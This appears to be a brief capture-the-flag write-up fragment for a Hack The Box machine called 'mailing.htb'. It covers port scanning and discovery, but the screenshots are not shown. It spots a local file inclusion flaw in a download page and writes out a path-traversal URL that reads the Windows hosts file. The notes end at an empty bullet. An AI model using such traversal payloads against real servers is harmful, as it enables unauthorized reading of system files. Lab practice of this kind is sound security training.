#### Port Scanning
![[Pasted image 20240506192019.png]]
#### Discovery

![[Pasted image 20240506192639.png]]

- Found Dowload button that seems to be LFI 
- Try to download host file using LFI 

```
http://mailing.htb/download.php?file=../../windows/system32/drivers/etc/hosts
```

- we can able to pull it


![[Pasted image 20240506192858.png]]

- 